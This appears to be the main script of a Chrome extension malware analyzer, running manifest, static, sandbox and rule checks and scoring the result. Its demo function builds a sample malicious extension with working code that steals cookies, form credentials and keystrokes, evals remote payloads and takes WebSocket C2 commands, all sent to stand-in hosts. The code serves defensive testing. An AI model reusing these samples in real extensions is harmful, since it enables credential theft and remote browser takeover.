#!/usr/bin/env python3
"""
CXT-SCAN v1.3 — Chrome Extension Malware Analyzer
Mode 1: Pre-Install Analysis

Changes from v1.0:
  Step 3 — .crx/.zip unpacked into ~/EXT-ANALYZER/samples/<ext_id>/unpacked/
  Step 4 — manifest.json scanned first (permissions, remote_config,
            network_domains, exfiltration) before touching JS files
  Step 5 — all JS files passed through sandbox_runner (Malware Jail,
            Box.js, JS-X-Ray, Synchrony) after static analysis

Usage:
    python analyze.py <extension.crx>
    python analyze.py <extension.zip>
    python analyze.py <extension_directory/>
    python analyze.py --demo
"""

import sys
import os
import json
import argparse
import shutil
import tempfile
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from utils.loader import load_extension, ExtensionLoadError, parse_extension_id, SAMPLES_BASE
from utils.js_preprocessor import preprocess as preprocess_js
from utils.reporter import (
    print_banner, print_extension_info,
    print_permission_results, print_api_results, print_network_results,
    print_remote_config_results, print_dynexec_results, print_exfil_results,
    print_final_verdict, save_json_report,
    Fore, Style,
)
from analyzers import permissions, sensitive_apis, network_domains
from analyzers import remote_config, dynamic_execution, exfiltration
from sandbox import sandbox_runner
from sandbox.sandbox_reporter import print_sandbox_results
from rules.engine import build_context, evaluate as evaluate_rules
from rules.reporter import print_rules_results



def _merge_rc(a, b):
    """Merge two RemoteConfigResult objects."""
    a.findings    += b.findings
    a.total_score += b.total_score
    return a

def _merge_net(a, b):
    """Merge two NetworkResult objects."""
    a.findings      += b.findings
    a.unique_domains |= b.unique_domains
    a.total_score   += b.total_score
    return a

def _merge_exfil(a, b):
    """Merge two ExfilResult objects."""
    a.findings        += b.findings
    a.chains_detected += b.chains_detected
    a.total_score     += b.total_score
    return a


def run_analysis(source: str, save_report: str = None, verbose: bool = False) -> dict:

    # ── Load: unpack into persistent samples dir (Step 3) ────────────────────
    print(f"\n  {Fore.WHITE}Loading: {Fore.YELLOW}{source}{Style.RESET_ALL}")
    try:
        manifest, js_files, unpacked_dir = load_extension(source)
    except ExtensionLoadError as e:
        print(f"\n  {Fore.RED}ERROR: {e}{Style.RESET_ALL}\n")
        sys.exit(1)

    ext_name = manifest.get("name", "Unknown Extension")
    print(f"  {Fore.GREEN}✓ Loaded{Style.RESET_ALL} {ext_name} "
          f"— {len(js_files)} JS file(s)  →  {unpacked_dir}")

    if not js_files:
        print(f"  {Fore.YELLOW}⚠ No JS files found.{Style.RESET_ALL}")

    print_extension_info(manifest, source, len(js_files))

    # ── Step 1b: JS pre-processing — detect inline/minified, expand via AST ───
    # Runs on JS files ONLY (loader already filters to .js).
    # Minified / one-liner files are pretty-printed through acorn+escodegen so
    # every downstream analyzer (static + sandbox) sees readable multi-line JS.
    print(f"\n  {Fore.CYAN}[Step 1b] JS pre-processing "
          f"(inline/minified detection → AST expand)...{Style.RESET_ALL}",
          end="", flush=True)

    js_files, preproc_result = preprocess_js(js_files)

    # Report what changed
    n_min  = preproc_result.total_minified
    n_exp  = preproc_result.total_expanded
    if n_min == 0:
        print(f" {Fore.GREEN}no minified files{Style.RESET_ALL}")
    else:
        print(f" {Fore.YELLOW}{n_min} minified detected{Style.RESET_ALL}, "
              f"{Fore.GREEN}{n_exp} expanded{Style.RESET_ALL}")
        for fr in preproc_result.file_results:
            if fr.was_minified:
                status = (f"{Fore.GREEN}✓ expanded{Style.RESET_ALL}"
                          if fr.was_expanded
                          else f"{Fore.YELLOW}⚠ kept as-is{Style.RESET_ALL}"
                               + (f" ({fr.error})" if fr.error else ""))
                ratio = (fr.expanded_size / fr.original_size
                         if fr.original_size else 1)
                print(f"      {fr.filename}  "
                      f"[{fr.original_size:,}→{fr.expanded_size:,} chars, "
                      f"×{ratio:.1f}]  {status}")

    # ── Step 2: manifest.json scanned FIRST ────────────────────────────────────
    print(f"\n  {Fore.CYAN}[Step 3] Scanning manifest.json...{Style.RESET_ALL}",
          end="", flush=True)

    perm_result    = permissions.analyze(manifest)             ; print(".", end="", flush=True)
    m_rc_result    = remote_config.analyze({})                 ; print(".", end="", flush=True)
    m_net_result   = network_domains.analyze({}, manifest)     ; print(".", end="", flush=True)
    m_exfil_result = exfiltration.analyze({})                  ; print(".", end="", flush=True)

    print(f" {Fore.GREEN}manifest done{Style.RESET_ALL}")

    # ── Step 5: scan all JS files (static) then merge with manifest results ───
    print(f"  {Fore.CYAN}[Step 4] Scanning JS files (static)...{Style.RESET_ALL}",
          end="", flush=True)

    api_result    = sensitive_apis.analyze(js_files)          ; print(".", end="", flush=True)
    js_rc_result  = remote_config.analyze(js_files)           ; print(".", end="", flush=True)
    js_net_result = network_domains.analyze(js_files, manifest); print(".", end="", flush=True)
    dyn_result    = dynamic_execution.analyze(js_files)       ; print(".", end="", flush=True)
    js_exfil      = exfiltration.analyze(js_files)            ; print(".", end="", flush=True)

    print(f" {Fore.GREEN}done{Style.RESET_ALL}")

    # Merge manifest + JS findings so nothing is dropped
    rc_result    = _merge_rc(m_rc_result,   js_rc_result)
    net_result   = _merge_net(m_net_result,  js_net_result)
    exfil_result = _merge_exfil(m_exfil_result, js_exfil)

    # ── Step 5: sandbox all JS files ─────────────────────────────────────────
    print(f"  {Fore.MAGENTA}[Step 5] Sandbox: "
          f"Malware Jail → Box.js → JS-X-Ray → Synchrony...{Style.RESET_ALL}")
    sandbox_result = sandbox_runner.analyze(js_files)
    print(f"  {Fore.GREEN}Sandbox done — "
          f"{len(sandbox_result.file_results)} file(s){Style.RESET_ALL}")

    # ── Rules engine ──────────────────────────────────────────────────────────
    print(f"  {Fore.RED}[Rules] Evaluating behavioural rules...{Style.RESET_ALL}",
          end="", flush=True)
    rules_ctx    = build_context(manifest, perm_result, api_result, net_result,
                                 rc_result, dyn_result, exfil_result, sandbox_result)
    rules_result = evaluate_rules(rules_ctx)
    print(f" {Fore.GREEN}{len(rules_result.matches)} matched{Style.RESET_ALL}")

    # ── Print results ─────────────────────────────────────────────────────────
    print_permission_results(perm_result)
    print_api_results(api_result)
    print_network_results(net_result)
    print_remote_config_results(rc_result)
    print_dynexec_results(dyn_result)
    print_exfil_results(exfil_result)
    print_sandbox_results(sandbox_result)
    print_rules_results(rules_result)

    # ── Scoring (static + sandbox) ────────────────────────────────────────────
    breakdown = {
        "permissions":   perm_result.total_score,
        "apis":          api_result.total_score,
        "network":       net_result.total_score,
        "remote_config": rc_result.total_score,
        "dynamic_exec":  dyn_result.total_score,
        "exfiltration":  exfil_result.total_score,
        "sandbox":       sandbox_result.total_score,
        "rules":         rules_result.total_score,
    }
    total_score  = sum(breakdown.values())
    max_possible = 300

    print_final_verdict(total_score, max_possible, breakdown, ext_name)

    # ── JSON report ───────────────────────────────────────────────────────────
    report = {
        "meta": {
            "analyzer":    "CXT-SCAN v1.3",
            "mode":        "pre-install",
            "timestamp":   datetime.now(timezone.utc).isoformat(),
            "source":      source,
            "unpacked_dir": unpacked_dir,
        },
        "extension": {
            "name":             ext_name,
            "version":          manifest.get("version"),
            "manifest_version": manifest.get("manifest_version"),
            "description":      manifest.get("description", ""),
            "js_files_count":   len(js_files),
        },
        "preprocessing": {
            "summary":         preproc_result.summary,
            "files_minified":  preproc_result.total_minified,
            "files_expanded":  preproc_result.total_expanded,
            "per_file": [
                {
                    "file":          r.filename,
                    "was_minified":  r.was_minified,
                    "was_expanded":  r.was_expanded,
                    "original_size": r.original_size,
                    "expanded_size": r.expanded_size,
                    "flags":         r.metrics.get("flags", []),
                    "error":         r.error,
                }
                for r in preproc_result.file_results
                if r.was_minified  # only log interesting files in report
            ],
        },
        "scores":  {**breakdown, "total": total_score},
        "verdict": _get_verdict_string(total_score),
        "findings": {
            "permissions": {
                "dangerous":       [{"name": f.name,  "score": f.risk_score, "reason": f.reason} for f in perm_result.findings],
                "host_risks":      [{"name": f.name,  "score": f.risk_score, "reason": f.reason} for f in perm_result.host_findings],
                "dangerous_combos":[{"combo": f.name, "score": f.risk_score, "reason": f.reason} for f in perm_result.combo_findings],
            },
            "sensitive_apis":     [{"api": f.api, "file": f.file, "line": f.line_number, "score": f.risk_score, "reason": f.reason} for f in api_result.findings[:50]],
            "external_domains":   [{"domain": f.domain, "url": f.url, "file": f.file, "score": f.risk_score, "category": f.category, "reason": f.reason} for f in net_result.findings[:30]],
            "remote_config":      [{"pattern": f.pattern_name, "file": f.file, "line": f.line_number, "score": f.risk_score, "reason": f.reason} for f in rc_result.findings[:20]],
            "dynamic_execution":  [{"technique": f.technique, "file": f.file, "line": f.line_number, "score": f.risk_score, "reason": f.reason} for f in dyn_result.findings[:20]],
            "exfiltration_chains":[{"chain": f.chain_type, "stage": f.stage, "file": f.file, "score": f.risk_score, "reason": f.reason} for f in exfil_result.findings[:30]],
            "rules_matched": [
                {
                    "rule":     m.name,
                    "severity": m.severity,
                    "score":    m.score,
                    "evidence": m.evidence,
                }
                for m in rules_result.matches
            ],
            "sandbox": {
                "runtime_urls":       sandbox_result.all_urls[:50],
                "eval_calls":         sandbox_result.all_eval_calls[:20],
                "chrome_api_calls":   [{"api": c.get("api")} for c in sandbox_result.all_chrome_api_calls[:30]],
                "boxjs_iocs":         sandbox_result.all_iocs[:30],
                "deobfuscated_files": sandbox_result.deobfuscated_files,
                "per_file_scores":    [{"file": fr.filename, "score": fr.risk_score, "signals": fr.risk_signals[:10]} for fr in sandbox_result.file_results],
            },
        },
    }

    if save_report:
        save_json_report(report, save_report)

    return report


def _get_verdict_string(score: int) -> str:
    if score >= 80:  return "MALICIOUS"
    if score >= 50:  return "HIGH RISK"
    if score >= 25:  return "SUSPICIOUS"
    if score >= 10:  return "LOW RISK"
    return "LIKELY SAFE"


def create_demo_extension() -> str:
    tmp = tempfile.mkdtemp(prefix="extanalyzer_demo_")
    manifest = {
        "manifest_version": 2,
        "name": "Super PDF Converter Pro",
        "version": "2.1.0",
        "description": "Convert any PDF online for free!",
        "permissions": ["tabs","cookies","webRequest","webRequestBlocking",
                        "storage","clipboardRead","history","management","downloads"],
        "host_permissions": ["<all_urls>"],
        "background": {"scripts": ["background.js"]},
        "content_scripts": [{"matches": ["<all_urls>"], "js": ["content.js"],
                              "run_at": "document_start"}],
    }
    background_js = """
chrome.runtime.onInstalled.addListener(async () => {
  const resp = await fetch('https://config.evil-tracker.ru/api/config?id=ext123');
  const cfg  = await resp.json();
  eval(cfg.payload);
  chrome.webRequest.onBeforeSendHeaders.addListener(function(details) {
    var cookies = details.requestHeaders.find(h => h.name === 'Cookie');
    if (cookies) {
      fetch('https://data.evil-tracker.ru/collect', {
        method: 'POST', body: JSON.stringify({url: details.url, cookies: cookies.value})
      });
    }
  }, {urls: ["<all_urls>"]}, ["requestHeaders"]);
});
var _0x3a2f = ['cookies', 'getAll', 'send'];
var code = atob('Y2hyb21lLmNvb2tpZXMuZ2V0QWxsKHt9LCBmdW5jdGlvbihjKXt9KQ==');
setTimeout(function() { eval(code); }, 5000);
var ws = new WebSocket('wss://c2.evil-tracker.ru/cmd');
ws.onmessage = function(event) { eval(event.data); };
"""
    content_js = """
document.addEventListener('DOMContentLoaded', function() {
  var forms = document.querySelectorAll('form');
  forms.forEach(function(form) {
    form.addEventListener('submit', function(e) {
      var inputs = form.querySelectorAll('input[type=password], input[type=email]');
      var data   = {};
      inputs.forEach(function(i) { data[i.name || i.type] = i.value; });
      navigator.sendBeacon('https://harvest.tracker.io/log',
        JSON.stringify({url: window.location.href, credentials: data}));
    });
  });
});
var keylog = '';
document.addEventListener('keydown', function(e) {
  keylog += e.key;
  if (keylog.length > 50) {
    fetch('https://exfil.badsite.com/steal', {
      method: 'POST', body: JSON.stringify({keys: btoa(keylog), url: window.location.href})
    });
    keylog = '';
  }
});
chrome.cookies.getAll({}, function(cookies) {
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://data.evil-tracker.ru/cookies');
  xhr.send(JSON.stringify(cookies));
});
"""
    with open(os.path.join(tmp, "manifest.json"), "w") as f: json.dump(manifest, f, indent=2)
    with open(os.path.join(tmp, "background.js"), "w") as f: f.write(background_js)
    with open(os.path.join(tmp, "content.js"),    "w") as f: f.write(content_js)
    return tmp


def main():
    print_banner()
    parser = argparse.ArgumentParser(
        description="CXT-SCAN v1.3 — Chrome Extension Malware Analyzer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python analyze.py extension.crx
  python analyze.py extension.zip
  python analyze.py ./unpacked_extension/
  python analyze.py extension.crx --output report.json
  python analyze.py --demo
        """,
    )
    parser.add_argument("source",    nargs="?",
                        help=".crx, .zip, or unpacked extension directory")
    parser.add_argument("--output",  "-o", metavar="FILE",
                        help="Save JSON report to file")
    parser.add_argument("--demo",    action="store_true",
                        help="Run on built-in suspicious extension demo")
    parser.add_argument("--verbose", "-v", action="store_true")

    args = parser.parse_args()

    if args.demo:
        print(f"  {Fore.CYAN}Running demo...{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Samples will be stored under: "
              f"{Fore.YELLOW}{SAMPLES_BASE}{Style.RESET_ALL}")
        demo_dir = create_demo_extension()
        output   = args.output or f"demo_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            run_analysis(demo_dir, save_report=output, verbose=args.verbose)
        finally:
            shutil.rmtree(demo_dir, ignore_errors=True)
        return

    if not args.source:
        parser.print_help()
        print(f"\n  {Fore.YELLOW}Tip: --demo to try the built-in example.{Style.RESET_ALL}\n")
        sys.exit(0)

    source = args.source.strip()
    output = args.output or \
        f"{Path(source).stem}_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    run_analysis(source, save_report=output, verbose=args.verbose)


if __name__ == "__main__":
    main()
